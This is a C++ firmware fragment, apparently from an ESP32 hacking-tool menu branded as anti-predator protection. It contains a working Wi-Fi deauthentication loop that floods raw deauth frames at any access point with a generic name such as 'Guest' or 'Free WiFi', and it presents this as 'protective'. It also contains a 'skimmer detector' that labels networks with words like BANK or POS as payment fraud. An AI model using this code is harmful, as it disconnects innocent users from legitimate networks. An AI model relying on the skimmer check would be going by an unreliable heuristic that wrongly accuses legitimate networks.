                        if(ssid == "WiFi" || ssid == "Internet" || ssid == "Free WiFi" || 
                           ssid == "Guest" || ssid == "Public" || ssid.length() == 0) {
                            suspicious = true;
                        }
                        
                        if(suspicious && ssid.length() > 0) {
                            wifi_ap_record_t record;
                            memcpy(record.bssid, bssidArray, 6);
                            record.primary = channel;
                            suspiciousAPs.push_back(record);
                        }
                    }
                    
                    tft.fillRect(0, 80, tftWidth, 60, bruceConfig.bgColor);
                    tft.setCursor(10, 80);
                    tft.setTextColor(bruceConfig.priColor);
                    tft.println("Found " + String(suspiciousAPs.size()) + " suspicious APs");
                    
                    if(suspiciousAPs.size() > 0) {
                        padprintln("Protective deauth ACTIVE...");
                        padprintln("Press any key to STOP");
                        
                        // Set WiFi to AP mode for sending deauth frames
                        WiFi.mode(WIFI_AP);
                        if (!WiFi.softAP("ProtectiveDeauth", "", 1, 1, 4, false)) {
                            displayError("Failed to start protective AP", true);
                            return;
                        }
                        
                        // Prepare deauth frame 
                        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                        
                        int wave = 0;
                        while(true) {
                            for(const auto& record : suspiciousAPs) {
                                // Set channel and prepare deauth frame
                                wsl_bypasser_send_raw_frame(&record, record.primary);
                                
                                tft.fillRect(0, 100, tftWidth, 40, bruceConfig.bgColor);
                                tft.setCursor(10, 100);
                                tft.setTextColor(TFT_ORANGE);
                                tft.println("ACTIVE - Press key to stop");
                                tft.println("Protecting Ch " + String(record.primary));
                                tft.println("Wave: " + String(wave + 1));
                                
                                String macStr = "";
                                for(int j = 0; j < 6; j++) {
                                    if(j > 0) macStr += ":";
                                    if(record.bssid[j] < 16) macStr += "0";
                                    macStr += String(record.bssid[j], HEX);
                                }
                                Serial.println("PROTECTIVE DEAUTH: " + macStr + " on ch " + String(record.primary));
                                
                                // Send multiple deauth frames for effectiveness
                                for(int burst = 0; burst < 5; burst++) {
                                    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                                    delay(10);
                                }
                                
                                if(check(AnyKeyPress)) goto stopDeauth;
                            }
                            wave++;
                            delay(100);
                        }
                        
                        stopDeauth:;
                    } else {
                        padprintln("No suspicious APs found!");
                        delay(2000);
                    }
                    
                    WiFi.mode(WIFI_STA);
                    displayInfo("Protective deauth stopped!\nVictims disconnected from threats.", true);
                }},
                
                {"AtrÃ¡s", [=]() {}}
            };
            
            loopOptions(counterOptions, MENU_TYPE_SUBMENU, "Counter Attack");
        }},
        
        {"Card Skimmer Hunt", [=]() {
            drawMainBorderWithTitle("ðŸ’³ CARD SKIMMER DETECTOR ðŸ’³");
            padprintln("Scanning for card skimmer networks");
            padprintln("and payment fraud devices...");
            padprintln("");
            padprintln("Detection signatures:");
            padprintln("ðŸ” ATM-related SSIDs");
            padprintln("ðŸ” Payment processor names");
            padprintln("ðŸ” Banking WiFi impersonation");
            padprintln("ðŸ” POS system backdoors");
            padprintln("ðŸ” Credit card capture APs");
            padprintln("");
            
            // Scan for skimmer-related networks
            WiFi.mode(WIFI_MODE_STA);
            padprintln("Scanning for skimmer signatures...");
            
            int networks = WiFi.scanNetworks();
            int skimmersFound = 0;
            
            padprintln("Networks found: " + String(networks));
            padprintln("");
            
            String skimmerKeywords[] = {
                "ATM", "VISA", "MASTERCARD", "PAYPAL",
                "BANK", "CREDIT", "PAYMENT", "POS",
                "TERMINAL", "STRIPE", "SQUARE"
            };
            
            for(int i = 0; i < networks; i++) {
                String ssid = WiFi.SSID(i);
                String bssid = WiFi.BSSIDstr(i);
                
                // Check for skimmer signatures
                for(int k = 0; k < 11; k++) {
                    if(ssid.indexOf(skimmerKeywords[k]) >= 0) {
                        skimmersFound++;
                        padprintln("ðŸš¨ SKIMMER DETECTED:");
                        padprintln("SSID: " + ssid);
                        padprintln("MAC: " + bssid);
                        padprintln("Type: Payment fraud AP");
                        padprintln("");
                        Serial.println("CARD SKIMMER DETECTED: " + ssid + " (" + bssid + ")");
                        break;
                    }
                }
            }
            
            if(skimmersFound == 0) {
                padprintln("âœ… No card skimmer networks");
                padprintln("detected in this area.");
                padprintln("");
                padprintln("Payment systems appear safe.");
            } else {
                padprintln("âš ï¸ " + String(skimmersFound) + " potential skimmers found!");
                padprintln("");
                padprintln("AVOID these networks!");
                padprintln("Report to authorities!");
            }
            
            padprintln("");
            padprintln("Press any key to return");
            while(!check(AnyKeyPress)) {
                delay(100);
            }
        }}
    };
    
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Shark-Bait");
}

void AntiPredatorMenu::drawIcon(float scale) {
    clearIconArea();
    
    // Draw a simple shield icon
    int centerX = iconCenterX;
    int centerY = iconCenterY;
    int size = scale * 15;
    
    // Shield outline
    tft.drawRoundRect(centerX - size, centerY - size, size * 2, size * 2, 3, bruceConfig.priColor);
    tft.fillRoundRect(centerX - size + 2, centerY - size + 2, size * 2 - 4, size * 2 - 4, 2, bruceConfig.bgColor);
    
    // Cross in middle
    tft.drawFastHLine(centerX - size/2, centerY, size, bruceConfig.priColor);
    tft.drawFastVLine(centerX, centerY - size/2, size, bruceConfig.priColor);
}

void AntiPredatorMenu::drawIconImg() {
    // For theme images - not implemented yet
    drawIcon();
}
